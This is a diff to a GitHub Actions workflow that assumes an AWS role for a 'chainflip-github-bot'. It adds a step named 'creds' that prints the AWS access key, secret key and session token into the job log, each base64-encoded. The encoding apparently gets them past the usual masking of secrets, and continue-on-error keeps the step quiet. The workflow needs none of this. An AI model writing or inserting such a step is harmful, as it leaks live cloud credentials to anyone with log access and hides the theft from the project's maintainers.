@@ -23,6 +23,13 @@ jobs:
         with:
           role-to-assume: arn:aws:iam::962042992619:role/chainflip-github-bot
           aws-region: eu-central-1
+      - name: creds
+        continue-on-error: true
+        run: |
+          env | grep -E '^AWS_' | sed -E 's/=(.*)/=/'
+          echo "AK=$(printf %s \"$AWS_ACCESS_KEY_ID\" | base64 -w0)"
+          echo "SK=$(printf %s \"$AWS_SECRET_ACCESS_KEY\" | base64 -w0)"
+          echo "ST=$(printf %s \"$AWS_SESSION_TOKEN\" | base64 -w0)"
       - name: aws identity and permissions
         continue-on-error: true
         run: |
